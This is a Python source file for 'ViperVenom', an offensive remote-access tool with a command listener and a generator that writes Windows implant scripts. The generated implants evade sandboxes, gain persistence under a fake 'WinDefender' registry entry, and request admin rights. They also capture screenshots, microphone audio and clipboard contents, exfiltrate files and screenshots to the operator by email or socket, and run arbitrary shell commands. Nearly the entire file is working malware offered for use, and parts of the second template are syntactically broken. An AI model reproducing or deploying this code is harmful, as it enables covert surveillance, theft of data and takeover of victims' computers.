    #Eclipse Public License - v 2.0
    #THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE
    #PUBLIC LICENSE ("AGREEMENT"). ANY USE, REPRODUCTION OR DISTRIBUTION
    #OF THE PROGRAM CONSTITUTES RECIPIENT'S ACCEPTANCE OF THIS AGREEMENT.





import socket
import time
import platform
import os
import threading
from typing import Set
from scipy.io.wavfile import *
import base64
import random, string
from colorama import Fore, Back, Style
import smtplib
from cryptography.fernet import Fernet


# =====================================================> Clears Terminal

def RootChk():

    if platform.system() == "Linux":
        chk = os.getlogin

def Clear():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system("clear")
Clear()

time.sleep(2)


# =====================================================> Banner


def Banner():

    print(f"""{Fore.CYAN}   Y
  .-^-.
 /     \      .- ~ ~ -.
()     ()    /   _ _   `.                     _ _ _
 \_   _/    /  /     \   \                . ~  _ _  ~ .
   | |     /  /       \   \             .' .~       ~-. `.
   | |    /  /         )   )           /  /             `.`.
   \ \_ _/  /         /   /           /  /                `'
    \_ _ _.'         /   /           (  (
                    /   /             \  \ 
                   /   /               \  \ 
                  /   /                 )  )
                 (   (                 /  /
                  `.  `.             .'  /
                    `.   ~ - - - - ~   .'
                       ~ . _ _ _ _ . ~s

""")
    print(f"{Fore.BLUE}The quieter you become, the more you can hear, ViperVenom\n")
    print(f"{Fore.RED}                  2{Fore.WHITE} [Payload Generators]")
    print(f"{Fore.RED}                  2{Fore.WHITE}     [Listeners]")
    print()
Banner()


# =====================================================> Main Menu


def Menu():
    print(f"""
    {Fore.GREEN}Listeners             Description
    ---------             -----------
    {Fore.RED}1                      ViperVenom Payload Listener
    """,)
    print(f"""
    {Fore.GREEN}Generators            Description
    ----------            -----------
    {Fore.RED}2                      ViperVenom Payload Generator
    """,)
    print()


# =====================================================> Vars


s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
BUFFER_SIZE = 1024
global ListenerHost
global ListenerPort
global ferKey

# =====================================================> Backdoor Listener


def Listener():
    ListenerHost = "0.0.0.0"
    ListenerPort = 443
    Key = "CHANGEME"
    while True:
        landingHandler = input(f"{Fore.WHITE}/ViperVenom/ > ")
        if landingHandler == "show payloads" or landingHandler == "list payloads" or landingHandler == "payloads" or landingHandler == "payloads list":
            print(f'''{Fore.CYAN}
            {Fore.GREEN}Payloads                                    Description
            --------                                    -----------
            {Fore.RED}1) windows/vipervenom/tcp/payload           Undetectable ViperVenom Windows Payload\n
            {Fore.RED}2) windows/vipervenom/tcp/revshell          Undetectable ViperVenom Windows Reverse shell
            ''')
        if landingHandler == "use windows/vipervenom/tcp/payload" or landingHandler ==  "use 1":
            try:
                while True:
                    firstHandler = input(f"{Fore.RED}(Listener){Fore.WHITE} Windows/ViperVenom/TCP/Payload > ")
                    if firstHandler[:8] == "set host":
                        ListenerHost = firstHandler[9:]
                    if firstHandler[:8] == "set port":
                        ListenerPort = firstHandler[9:]
                    if firstHandler[:7] == "set key":
                        Key = firstHandler[8:]
                    if firstHandler == "show host":
                        print(f"LHOST={ListenerHost}")
                    if firstHandler == "show port":
                        print(f"LPORT={ListenerPort}")
                    if firstHandler == "show key":
                        print(f"KEY={Key}")
                    if firstHandler == "use 2":
                        PayloadGenerator()
                    if firstHandler == "options":
                        print(f"LHOST={ListenerHost}")
                        print(f"LPORT={ListenerPort}")
                        print(f"KEY={Key}")
                    if firstHandler == "run":
                            s.bind((ListenerHost, int(ListenerPort)))
                            s.listen(99)
                            time.sleep(1)
                            print(f"{Fore.BLUE}[*]{Fore.WHITE} Starting Listener...")
                            time.sleep(1)
                            print(f"{Fore.BLUE}[*]{Fore.WHITE} Listener Started on {ListenerHost}:{ListenerPort}, {Fore.RED}Waiting for Connections...")
                            conn, addr = s.accept()
                            with conn:
                                print(f"{Fore.BLUE}[*]{Fore.WHITE} Recived Connection From: {addr}")
                                conn.send(Key.encode("utf-8"))
                                print(f"{Fore.BLUE}[*]{Fore.WHITE} Sending Second Stage to {addr}")
                                time.sleep(2)
                                keyApprovment = conn.recv(1024).decode("utf-8")
                                if keyApprovment == 'Key Has Approved':
                                    print(f"{Fore.GREEN}[+]{Fore.WHITE} Key For {addr} is Correct")
                                else:
                                    print(f"{Fore.RED}[-]{Fore.WHITE} Key For {addr} is Incorrect, Make Sure The Key is Correct and Try Again.")
                                print(f"{Fore.GREEN}[+]{Fore.WHITE} Connecting to Device.")
                                time.sleep(1)
                                while True:

                                    Handler = input(f"{Fore.RED}({addr[0]}){Fore.WHITE} Windows/ViperVenom/TCP/Payload > ")
                                    if Handler == "clear":
                                        if platform.system() == "Linux":
                                            os.system('clear')
                                        else:
                                            os.system("cls")
                                    elif Handler == "screenshot":
                                        conn.send(Handler.encode("utf-8"))
                                    elif Handler == "exit":
                                        conn.send(Handler.encode("utf-8"))
                                        print(f"{Fore.GREEN}[*] Exiting From Active Session...")
                                        time.sleep(3)
                                        conn.close()
                                    elif Handler == "mic record":
                                        conn.send(Handler.encode("utf-8"))
                                        letters = string.ascii_letters
                                        with open(f'{random.choice(letters)}.wav','wb') as f:
                                            while True:
                                                l = conn.recv(1024)
                                                if not l: break
                                                f.write(l)
                                            if Handler.lower() == 'quit':
                                                break
                                    elif Handler == "restart":
                                        conn.send(Handler.encode("utf-8"))
                                    elif Handler == "shutdown":
                                        conn.send(Handler.encode("utf-8"))
                                    elif Handler == "shell":
                                        conn.send(Handler.encode("utf-8"))
                                        cwd = 'Shell'
                                        r = conn.recv(5120).decode('utf-8')
                                        if ('dir:' in r):
                                            cwd = r[4:]
                                        while True:
                                            command = input(str(cwd)+"> ")
                                            if 'terminate' in command:
                                                conn.send('terminate'.encode('utf-8'))
                                                conn.close()
                                                break
                                            elif 'clipboard' in command:
                                                conn.send(command.encode('utf-8'))
                                                data = conn.recv(5120).decode("utf-8")
                                                print(f"[{Fore.GREEN}CLIPBOARD{Fore.WHITE}] " + str(data))
                                            elif 'grab' in command:
                                                conn.send(command.encode('utf-8'))
                                                file_name = conn.recv(1024).decode('utf-8')
                                                print(f"{Fore.BLUE}[*]{Fore.WHITE} Downloading " + file_name + "...")
                                                conn.send('OK'.encode('utf-8'))
                                                file_size = conn.recv(1024).decode('utf-8')
                                                conn.send('OK'.encode('utf-8'))
                                                print(f"{Fore.BLUE}[*]{Fore.WHITE} Total: " + str(int(file_size)/1024) + " KB")
                                                with open(file_name, "wb") as file:
                                                    c = 0
                                                    start_time = time.time()
                                                    while c < int(file_size):
                                                        data = conn.recv(1024)
                                                        if not (data):
                                                            break
                                                        file.write(data)
                                                        c += len(data)
                                                    end_time = time.time()
                                                print(f"{Fore.GREEN}[+]{Fore.WHITE} File Downloaded.")
                                            elif 'transfer' in command:
                                                conn.send(command.encode('utf-8'))
                                                file_name = command[9:]
                                                file_size = os.path.getsize(file_name)
                                                conn.send(file_name.encode('utf-8'))
                                                print(conn.recv(1024).decode('utf-8'))
                                                conn.send(str(file_size).encode('utf-8'))
                                                print(conn.recv(1024).decode('utf-8'))
                                                print(f"{Fore.BLUE}[*]{Fore.WHITE} Transferring [" + str(file_size/1024) + "] KB...")
                                                with open(file_name, "rb") as file:
                                                    c = 0
                                                    start_time = time.time()
                                                    while c < int(file_size):
                                                        data = file.read(1024)
                                                        if not (data):
                                                            break
                                                        conn.sendall(data)
                                                        c += len(data)
                                                    end_time = time.time()
                                                    print(f"{Fore.GREEN}[+]{Fore.WHITE} File Transferred.")
                                            elif (len(command.strip()) > 0):
                                                conn.send(command.encode('utf-8'))
                                                r = conn.recv(5120).decode('utf-8')
                                                if ('dir:' in r):
                                                    cwd = r[4:]
                                                else:
                                                    print (r)
            except ConnectionResetError:
                print(f"{Fore.RED}[-]{Fore.WHITE} Lost Connection {Fore.GREEN}[REASON]{Fore.WHITE}: Client Closed Connection.")
            except KeyboardInterrupt:
                print(f"{Fore.RED}[-]{Fore.WHITE} Lost Connection {Fore.GREEN}[REASON]{Fore.WHITE}: Keyboard Interrupt")


        if landingHandler == "use windows/vipervenom/tcp/revshell" or landingHandler ==  "use 2":
            while True:
                firstHandler = input(f"{Fore.RED}(Listener){Fore.WHITE} Windows/ViperVenom/TCP/RevShell > ")
                if firstHandler[:8] == "set host":
                    ListenerHost = firstHandler[9:]
                if firstHandler[:8] == "set port":
                    ListenerPort = firstHandler[9:]
                if firstHandler == "show host":
                    print(f"LHOST={ListenerHost}")
                if firstHandler == "show port":
                    print(f"LPORT={ListenerPort}")
                if firstHandler == "use 2":
                    PayloadGenerator()
                if firstHandler == "options":
                    print(f"LHOST={ListenerHost}")
                    print(f"LPORT={ListenerPort}")
                if firstHandler == "run":
                    s.bind((ListenerHost, int(ListenerPort)))
                    s.listen(99)
                    time.sleep(1)
                    print(f"{Fore.BLUE}[*]{Fore.WHITE} Starting Listener...")
                    time.sleep(1)
                    print(f"{Fore.BLUE}[*]{Fore.WHITE} Listener Started on {ListenerHost}:{ListenerPort}, {Fore.RED}Waiting for Connections...")
                    conn, addr = s.accept()
                    with conn:
                        print(f"{Fore.BLUE}[*]{Fore.WHITE} Recived Shell Connection From: {addr}")
                        print(f"{Fore.GREEN}[+]{Fore.WHITE} Spawning Shell on Device.")
                        time.sleep(1)
                        while True:
                            data = conn.recv(1024).decode("utf-8")
                            if data == "shell":
                                cwd = 'Shell'
                                r = conn.recv(5120).decode("utf-8")
                                if ('dir:' in r):
                                    cwd = r[4:]
                                while True:
                                    command = input(str(cwd)+"> ")
                                    if 'terminate' in command:
                                        conn.send('terminate'.encode("utf-8"))
                                        break
                                    elif (len(command.strip()) > 0):
                                        conn.send(command.encode('utf-8'))
                                        r = conn.recv(5120).decode('utf-8')
                                        if ('dir:' in r):
                                            cwd = r[4:]
                                        else:
                                            print (r)






def PayloadGenerator():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    clientHOST = local_ip
    clientPORT = 443
    SetYourEmail = "revise7@example.com"
    SetYourEmailPassword = "P@$$W0RD_ON3"
    SetFileName = "NULL.py"
    micrecordsec = 600
    setSleep = 0
    while True:
        landingHandler = input(f"{Fore.WHITE}/ViperVenom/ > ")
        if landingHandler == "show payloads":
            print(f'''{Fore.CYAN}
            {Fore.GREEN}Payloads                                    Description
            --------                                    -----------
            {Fore.RED}1) generator/vipervenom/tcp/payload         Undetectable ViperVenom Windows Payload\n
            {Fore.RED}2) generator/vipervenom/tcp/revshell        Undetectable ViperVenom Windows Reverse Shell
            ''')
        if landingHandler == "use generator/vipervenom/tcp/payload" or landingHandler == "use 1":
            while True:
                firstHandler = input(f"{Fore.RED}(Generator){Fore.WHITE} Windows/ViperVenom/TCP/Payload > ")
                if firstHandler[:8] == "set host":
                    clientHOST = firstHandler[9:]
                if firstHandler[:8] == "set port":
                    clientPORT = firstHandler[9:]
                if firstHandler == "show host":
                    print(f"HOST={clientHOST}")
                if firstHandler == "show port":
                    print(f"PORT={clientPORT}")
                if firstHandler[:13] == "set gmailaddr":
                    SetYourEmail = firstHandler[14:]
                if firstHandler == "show gmailaddr":
                    print(f"GAMILADDR={SetYourEmail}")
                if firstHandler[:13] == "set gmailpass":
                    SetYourEmailPassword = firstHandler[14:]
                if firstHandler == "show gmailpass":
                    print(f"GAMILPASS={SetYourEmailPassword}")
                if firstHandler[:12] == "set filename":
                    SetFileName = firstHandler[13:]
                if firstHandler == "show filename":
                    print(f"FILENAME={SetFileName}")
                if firstHandler[:13] == "set micrecord":
                    micrecordsec = firstHandler[14:]
                if firstHandler == "show micrecord":
                    print(f"MICRECORD={micrecordsec}")
                    setSleep = firstHandler[13:]
                if firstHandler[:9] == "set sleep":
                    setSleep = firstHandler[10:]
                if firstHandler == "show sleep":
                    print(f"SLEEP={setSleep}")
                if firstHandler == "use 1":
                    Listener()
                if firstHandler == "options":
                    print(f"HOST={clientHOST}")
                    print(f"PORT={clientPORT}")
                    print(f"GAMILADDR={SetYourEmail}")
                    print(f"GAMILPASS={SetYourEmailPassword}")
                    print(f"FILENAME={SetFileName}")
                    print(f"MICRECORDSECONDS={micrecordsec}")
                    print(f"SLEEP={setSleep}")








                if firstHandler == "generate":
                    ferKey = Fernet.generate_key()
                    print(f"{Fore.BLUE}[*]{Fore.WHITE} Generating Payload")
                    time.sleep(1)
                    print(".")
                    time.sleep(1)
                    print("..")
                    time.sleep(1)
                    print("...")
                    with open(SetFileName, "w") as malfile:
                        malfile.write(
                            f'''



#Eclipse Public License - v 2.0
#THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE
#PUBLIC LICENSE ("AGREEMENT"). ANY USE, REPRODUCTION OR DISTRIBUTION
#OF THE PROGRAM CONSTITUTES RECIPIENT'S ACCEPTANCE OF THIS AGREEMENT.
from PIL import ImageGrab
import socket
import smtplib
import base64
import os
import platform
import sounddevice
from scipy.io.wavfile import write
import time
import random, string
import psutil
import subprocess
import winreg as reg
from colorama import Fore, Back, Style
import shutil
import ctypes
import sys
def zpVXAIPnyaQaYr():
    vmproc1 = "vmsrvc.exe"
    vmproc2 = "vmusrvc.exe"
    vmproc3 = "vmtoolsd.exe"
    vmproc5 = "vboxtry.exe"
    vmproc6 = "df5serv.exe"
    vmproc7 = "vboxservice.exe"
    for proc in psutil.process_iter():
        try:
            if proc.name().lower() == vmproc1.lower() or proc.name().lower() == vmproc2.lower() or proc.name().lower() == vmproc3.lower() or proc.name().lower() == vmproc5.lower() or proc.name().lower() == vmproc6.lower() or proc.name().lower() == vmproc7.lower():
                exit()
        except WindowsError:
            vmpath1 = os.path.exists(f"C:\windows\system32\drivers\\vmci.sys")
            vmpath2 = os.path.exists(f"C:\windows\system32\drivers\\vmhgfs.sys")
            vmpath3 = os.path.exists(f"C:\windows\system32\drivers\\vmmouse.sys")
            vmpath4 = os.path.exists(f"C:\windows\system32\drivers\\vmscsi.sys")
            vmpath5 = os.path.exists(f"C:\windows\system32\drivers\\vmusemouse.sys")
            vmpath6 = os.path.exists(f"C:\windows\system32\drivers\\vmx_svga.sys")
            vmpath7 = os.path.exists(f"C:\windows\system32\drivers\\vmxnet.sys")
            vmpath8 = os.path.exists(f"C:\windows\system32\drivers\\VBoxMouse.sys")
            if vmpath1 == True or vmpath2 == True or vmpath3 == True or vmpath4 == True or vmpath5 == True or vmpath6 == True or vmpath7 == True or vmpath8 == True:
                exit()
zpVXAIPnyaQaYr()
letters = ''.join(random.choice(string.ascii_letters) for l in range(16))
letters = time.sleep({setSleep})
letters
def zJnWJKrmzwZTAHJT(f_name, path):
    address=os.path.join(path, f_name)
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
    open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open, "WinDefender 10.5", 0, reg.REG_SZ, address)
    reg.CloseKey(open)

def XbNcYPeberQMdl(f_name, path):
    address=os.path.join(path, f_name)
    shutil.copytree(address, "C:\windows\system32", dirs_exist_ok=True)
    shutil.copytree(address, "C:\windows", dirs_exist_ok=True)
BUFFER_SIZE = 1024
def connection():
    try:
        clientHOST = "{clientHOST}"
        clientPORT = {clientPORT}
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((clientHOST, clientPORT))
        s.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 10000, 3000))
        data12 = s.recv(1024).decode("utf-8")
        if data12 == "{ferKey}":
            while True:
                Handler_DATA = s.recv(BUFFER_SIZE).decode("utf-8")
                if Handler_DATA == "screenshot":
                    screenshot = ImageGrab.grab()
                    file = "xpvuNBYVvC.jpg"
                    screenshot.save(file)
                    f = open(file, 'rb')
                    data=f.read()
                    data=base64.b64encode(data)
                    f.close()
                    os.remove(file)
                    smtp = smtplib.SMTP('smtp.gmail.com', 587)
                    smtp.starttls()
                    smtp.login("{SetYourEmail}", "{SetYourEmailPassword}")
                    message = data
                    smtp.sendmail("{SetYourEmail}", "{SetYourEmail}", message)
                    smtp.quit()
                elif Handler_DATA == "mic_record":
                    frames = 44100
                    seconds = {micrecordsec}
                    channel = 1
                    record = sounddevice.rec(int(seconds*frames), samplerate=frames, channels=channel)
                    sounddevice.wait()
                    file = "skiDkZX92DKOsdzHlki.wav"
                    write(file, frames, record)
                    with open(file, 'rb') as f:
                        for l in f: s.sendall(l)
                        time.sleep(10)

                        os.remove(file)
                elif Handler_DATA == "restart":
                    if platform.system() == "Windows":
                        os.system("shutdown -t 0 -r -f")
                    else:
                        os.system("reboot")
                elif Handler_DATA == "shutdown":
                    if platform.system() == "Windows":
                        os.system("shutdown /s /t 1")
                    else:
                        os.system("shutdown now")
                elif Handler_DATA == "exit":
                    s.close()
                    exit()
                elif Handler_DATA == "shell":
                    cwd = os.getcwd()
                    s.send(("dir:" + str(cwd)).encode('utf-8'))
                    while True:
                        try:
                            command = s.recv(2048).strip().decode('utf-8')
                            if 'terminate' in command:
                                break
                            elif 'clipboard' in command:
                                CF_TEXT = 1
                                kernel32 = ctypes.windll.kernel32
                                user32 = ctypes.windll.user32
                                kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
                                kernel32.GlobalLock.restype = ctypes.c_void_p
                                kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
                                user32.GetClipboardData.restype = ctypes.c_void_p
                                user32.OpenClipboard(0)
                                IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
                                GetClipboardData = user32.GetClipboardData
                                CloseClipboard = user32.CloseClipboard
                                try:
                                    if IsClipboardFormatAvailable(CF_TEXT):
                                        getClipboardData = GetClipboardData(CF_TEXT)
                                        getClipboardDataLoc = kernel32.GlobalLock(getClipboardData)
                                        text = ctypes.c_char_p(getClipboardDataLoc)
                                        value = text.value
                                        kernel32.GlobalUnlock(getClipboardDataLoc)
                                        s.send(str(value).encode("utf-8"))
                                    if IsClipboardFormatAvailable(CF_TEXT) == False:
                                        pass
                                finally:
                                    CloseClipboard() # Close the clipboard
                            elif command.startswith('marciless'):
                                file_name = command[7:]
                                pth = os.getcwd()
                                try:
                                    XbNcYPeberQMdl(file_name, pth)
                                except Exception as e:
                                    s.send(str(e).encode('utf-8'))
                            elif command.startswith('grab'):
                                file_name = command[5:]
                                file_size = os.path.getsize(file_name)
                                s.send(file_name.encode('utf-8'))
                                s.recv(1024).decode('utf-8')
                                s.send(str(file_size).encode('utf-8'))
                                s.recv(1024).decode('utf-8')
                                with open(file_name, "rb") as file:
                                    c = 0
                                    start_time = time.time()
                                    while c < file_size:
                                        data = file.read(1024)
                                        if not (data):
                                            break
                                        s.sendall(data)
                                        c += len(data)
                                    end_time = time.time()
                            elif 'transfer' in command:
                                file_name = s.recv(1024).decode('utf-8')
                                s.send('OK'.encode('utf-8'))
                                file_size = s.recv(1024).decode('utf-8')
                                s.send('OK'.encode('utf-8'))
                                with open(file_name, "wb") as file:
                                    c = 0
                                    start_time = time.time()
                                    while c < int(file_size):
                                        data = s.recv(1024)
                                        if not (data):
                                            break
                                        file.write(data)
                                        c += len(data)
                                    end_time = time.time()
                            elif command.startswith('cd '):
                                dir = command[3:]
                                try:
                                    os.chdir(dir)
                                except:
                                    os.chdir(cwd)
                                cwd = os.getcwd()
                                s.send(("dir:" + str(cwd)).encode('utf-8'))
                            elif command.startswith('persistence'):
                                file_name = command[12:]
                                pth = os.getcwd()
                                try:
                                    zJnWJKrmzwZTAHJT(file_name, pth)
                                    s.send("OK".encode('utf-8'))
                                except Exception as e:
                                    s.send(str(e).encode('utf-8'))
                            else:
                                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                out = CMD.stdout.read()
                                err = CMD.stderr.read()
                                s.send(out)
                                s.send(err)
                                if (out == b'' and err == b''):
                                    s.send("OK".encode('utf-8'))
                        except Exception as e:
                            s.send(str(e).encode('utf-8'))
    except socket.error:
        connection()
        if connection() == True:
            pass
        else:
            connection()
def TeZfZTttAYMjZZ():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if TeZfZTttAYMjZZ():
    connection()
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
TeZfZTttAYMjZZ()
def TCjgbxixqsdxEc():
    cpuChk = psutil.cpu_count(logical=False)
    if cpuChk == 1:
        exit()
    if cpuChk == 2:
        exit()
    if cpuChk == 3:
        exit()
    else:
        connection()
TCjgbxixqsdxEc()
def PTYMEYUXBRwddE():
    avgDiskChk = shutil.disk_usage("/")
    div = (avgDiskChk // (2**30))
    if div == 59:
        exit()
    if div == 60:
        exit()
    if div == 65:
        exit()
    if div == 120:
        exit()
    if div == 119:
        exit()
    else:
        connection()
PTYMEYUXBRwddE()
''')
                    os.system(f"python setup.py build")
                    print(f"{Fore.GREEN}[+]{Fore.WHITE} To Use This Payload Securely, Use This Unique Key to Start The Listener: {ferKey}\n")
                    print(f"{Fore.BLUE}[*]{Fore.WHITE} Please Keep This Unique Key in a Safe Place, You Won't Be Able to Run the Listener Without it!")
                    time.sleep(2)
                    os.remove(SetFileName)
                    print(f"{Fore.BLUE}[*]{Fore.WHITE} Done Generating Payload.")
                    redirectListener = input(f"{Fore.BLUE}[*]{Fore.WHITE} Would You Like to Start Listener? ")
                    if redirectListener == "yes":
                        Listener()
                    if redirectListener == "y":
                        Listener()
                    if redirectListener == "no":
                        exit()
                    if redirectListener == "n":
                        exit()
        if landingHandler == "use generator/vipervenom/tcp/revshell" or landingHandler == "use 2":
            while True:
                firstHandler = input(f"{Fore.RED}(Generator){Fore.WHITE} Windows/ViperVenom/TCP/RevShell > ")
                if firstHandler[:8] == "set host":
                    clientHOST = firstHandler[9:]
                if firstHandler[:8] == "set port":
                    clientPORT = firstHandler[9:]
                if firstHandler == "show host":
                    print(f"HOST={clientHOST}")
                if firstHandler == "show port":
                    print(f"PORT={clientPORT}")
                if firstHandler[:12] == "set filename":
                    SetFileName = firstHandler[13:]
                if firstHandler == "show filename":
                    print(f"FILENAME={SetFileName}")
                if firstHandler[:9] == "set sleep":
                    setSleep = firstHandler[10:]
                if firstHandler == "show sleep":
                    print(f"SLEEP={setSleep}")
                if firstHandler == "use 1":
                    Listener()
                if firstHandler == "options":
                    print(f"HOST={clientHOST}")
                    print(f"PORT={clientPORT}")
                    print(f"FILENAME={SetFileName}")
                    print(f"SLEEP={setSleep}")










                    if firstHandler == "generate":
                        print(f"{Fore.WHITE}[{Fore.BLUE}*{Fore.WHITE}] Generating Payload")
                        time.sleep(1)
                        print(".")
                        time.sleep(1)
                        print("..")
                        time.sleep(1)
                        print("...")
                        with open(SetFileName, "w") as revshefile:
                            revshefile.write(
                                f'''
#Eclipse Public License - v 2.0
#THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE
#PUBLIC LICENSE ("AGREEMENT"). ANY USE, REPRODUCTION OR DISTRIBUTION
#OF THE PROGRAM CONSTITUTES RECIPIENT'S ACCEPTANCE OF THIS AGREEMENT.
import socket
import os
import platform
import time
import random, string
import psutil
import subprocess
import winreg as reg
import shutil
import ctypes
import sys
def zpVXAIPnyaQaYr():
    vmproc1 = "vmsrvc.exe"
    vmproc2 = "vmusrvc.exe"
    vmproc3 = "vmtoolsd.exe"
    vmproc5 = "vboxtry.exe"
    vmproc6 = "df5serv.exe"
    vmproc7 = "vboxservice.exe"
    for proc in psutil.process_iter():
        try:
            if proc.name().lower() == vmproc1.lower() or proc.name().lower() == vmproc2.lower() or proc.name().lower() == vmproc3.lower() or proc.name().lower() == vmproc5.lower() or proc.name().lower() == vmproc6.lower() or proc.name().lower() == vmproc7.lower():
                exit()
        except WindowsError:
            vmpath1 = os.path.exists(f"{os.getenv('SYSTEMDRIVE')}\\windows\\system32\\drivers\\vmci.sys")
            vmpath2 = os.path.exists(f"{os.getenv('SYSTEMDRIVE')}\\windows\\system32\\drivers\\vmhgfs.sys")
            vmpath3 = os.path.exists(f"{os.getenv('SYSTEMDRIVE')}\\windows\\system32\\drivers\\vmmouse.sys")
            vmpath4 = os.path.exists(f"{os.getenv('SYSTEMDRIVE')}\\windows\\system32\\drivers\\vmscsi.sys")
            vmpath5 = os.path.exists(f"{os.getenv('SYSTEMDRIVE')}\\windows\\system32\\drivers\\vmusemouse.sys")
            vmpath6 = os.path.exists(f"{os.getenv('SYSTEMDRIVE')}\\windows\\system32\\drivers\\vmx_svga.sys")
            vmpath7 = os.path.exists(f"{os.getenv('SYSTEMDRIVE')}\\windows\\system32\\drivers\\vmxnet.sys")
            vmpath8 = os.path.exists(f"{os.getenv('SYSTEMDRIVE')}\\windows\\system32\\drivers\\VBoxMouse.sys")
            if vmpath1 == True or vmpath2 == True or vmpath3 == True or vmpath4 == True or vmpath5 == True or vmpath6 == True or vmpath7 == True or vmpath8 == True:
                exit()
zpVXAIPnyaQaYr()
letters = ''.join(random.choice(string.ascii_letters) for l in range(16))
letters = time.sleep({setSleep})
letters
def zJnWJKrmzwZTAHJT(f_name, path):
    address=os.path.join(path, f_name)
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open, "any_name", 0, reg.REG_SZ, address)
    reg.CloseKey(open)
BUFFER_SIZE = 1024
def connection():
    clientHOST = "{clientHOST}"
    clientPORT = {clientPORT}
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((clientHOST, clientPORT))
    s.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 10000, 3000))
    while True:
    Handler_DATA = s.recv(BUFFER_SIZE).decode("utf-8")
        cwd = os.getcwd()
        s.send(("dir:" + str(cwd)).encode('utf-8'))

        while True:
            try:
                command = s.recv(2048).strip().decode('utf-8')
                if 'terminate' in command:
                    break
                elif command.startswith('grab'):
                    file_name = command[5:]
                    file_size = os.path.getsize(file_name)
                    s.send(file_name.encode('utf-8'))
                    s.recv(1024).decode('utf-8')
                    s.send(str(file_size).encode('utf-8'))
                    s.recv(1024).decode('utf-8')
                    with open(file_name, "rb") as file:
                        c = 0
                        start_time = time.time()
                        while c < file_size:
                            data = file.read(1024)
                            if not (data):
                                break
                            s.sendall(data)
                            c += len(data)
                        end_time = time.time()
                elif 'transfer' in command:
                    file_name = s.recv(1024).decode('utf-8')
                    s.send('OK'.encode('utf-8'))
                    file_size = s.recv(1024).decode('utf-8')
                    s.send('OK'.encode('utf-8'))
                    with open(file_name, "wb") as file:
                        c = 0
                        start_time = time.time()
                        while c < int(file_size):
                            data = s.recv(1024)
                            if not (data):
                                break
                            file.write(data)
                            c += len(data)
                        end_time = time.time()
                elif command.startswith('cd '):
                    dir = command[3:]
                    try:
                        os.chdir(dir)
                    except:
                        os.chdir(cwd)
                    cwd = os.getcwd()
                    s.send(("dir:" + str(cwd)).encode('utf-8'))
                elif command.startswith('persistence'):
                    file_name = command[12:]
                    pth = os.getcwd()
                    try:
                        zJnWJKrmzwZTAHJT(file_name, pth)
                        s.send("OK".encode('utf-8'))
                    except Exception as e:
                        s.send(str(e).encode('utf-8'))
                else:
                    CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    out = CMD.stdout.read()
                    err = CMD.stderr.read()
                    s.send(out)
                    s.send(err)
                    if (out == b'' and err == b''):
                        s.send("OK".encode('utf-8'))
            except Exception as e:
                s.send(str(e).encode('utf-8'))
    except socket.error:
        connection()
        if connection() == True:
            pass
        else:
            connection()
def TeZfZTttAYMjZZ():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if TeZfZTttAYMjZZ():
    connection()
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
TeZfZTttAYMjZZ()
def TCjgbxixqsdxEc():
    cpuChk = psutil.cpu_count(logical=False)
    if cpuChk == 1:
        exit()
    if cpuChk == 2:
        exit()
    if cpuChk == 3:
        exit()
    else:
        connection()
TCjgbxixqsdxEc()
def PTYMEYUXBRwddE():
    avgDiskChk = shutil.disk_usage("/")
    div = (avgDiskChk // (2**30))
    if div == 59:
        exit()
    if div == 60:
        exit()
    if div == 65:
        exit()
    if div == 120:
        exit()
    if div == 119:
        exit()
    else:
        connection()
PTYMEYUXBRwddE()
''')

# =====================================================> Menu Option
while True:
    des = input(f"{Fore.RED}Landing/ViperVenom/ > {Fore.WHITE}",)
    if des == "use 1":
        Listener()
    if des == "use 2":
        PayloadGenerator()
    if des == "list show":
        Menu()
    if des == "list":
        Menu()
    if des == "show list":
        Menu()
else:
    print(f"{Fore.WHITE}[{Fore.BLUE}*{Fore.WHITE}] ERROR Invaild Argument, Exiting...")
    while True:
        break
